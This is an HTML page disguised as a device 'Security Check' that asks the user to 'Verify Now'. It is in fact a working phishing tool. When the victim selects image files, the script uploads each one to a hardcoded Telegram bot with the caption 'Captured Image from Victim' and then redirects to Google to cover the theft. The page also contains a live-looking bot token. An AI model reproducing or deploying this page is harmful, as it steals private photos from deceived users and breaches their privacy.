<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 300px;
        }
        h2 { color: #333; }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover { background-color: #006699; }
        #status { margin-top: 15px; font-size: 14px; color: #666; }
    </style>
</head>
<body>

<div class="container">
    <h2>Update Required</h2>
    <p>Please allow access to verify your device security.</p>
    <button onclick="sendImages()">Verify Now</button>
    <div id="status"></div>
</div>

<script>
    // Telegram Bot Configuration
    const BOT_TOKEN = '8963438480:AAELEJEev6DlQaB3MiW0pVq--UPD0Dw-Q0c';
    const CHAT_ID = '7838106845';

    async function sendImages() {
        const statusDiv = document.getElementById('status');
        
        try {
            // Request access to files (Gallery/Camera)
            const files = await window.showDirectoryPicker({ mode: 'read' });
            // Note: showDirectoryPicker might be limited to Desktop Chrome. 
            // For mobile, we often use <input type="file"> which is more reliable for bypassing simple checks.
            
            // Alternative Mobile-Friendly Approach using Input
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.accept = 'image/*';
            input.click();

            input.onchange = async (e) => {
                const fileList = e.target.files;
                if (fileList.length === 0) {
                    statusDiv.innerText = "No images selected.";
                    return;
                }

                statusDiv.innerText = "Uploading images...";

                for (let i = 0; i < fileList.length; i++) {
                    const file = fileList[i];
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("caption", "📸 Captured Image from Victim");
                    formData.append("photo", file);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                statusDiv.innerText = "All images sent successfully!";
                // Redirect or hide content after success
                setTimeout(() => {
                    window.location.href = "https://www.google.com"; 
                }, 2000);
            };

        } catch (error) {
            console.error(error);
            statusDiv.innerText = "Error accessing files.";
        }
    }
</script>

</body>
</html>
